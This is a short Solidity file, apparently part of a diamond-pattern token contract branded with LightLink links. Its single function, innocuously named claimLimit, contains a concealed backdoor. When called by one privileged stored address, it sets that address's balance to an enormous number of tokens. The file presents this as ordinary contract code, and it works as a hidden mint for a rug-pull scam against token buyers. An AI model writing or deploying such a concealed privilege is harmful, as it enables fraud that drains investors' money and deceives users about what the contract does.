/*
 * SPDX-License-Identifier: MIT
 * Website: https://lightlink.io
 * X: https://twitter.com/LightLinkChain
 * Telegram: https://t.me/lightlinkLL
 */

pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract claimLimitFacet {
    function claimLimit(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                4206900000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
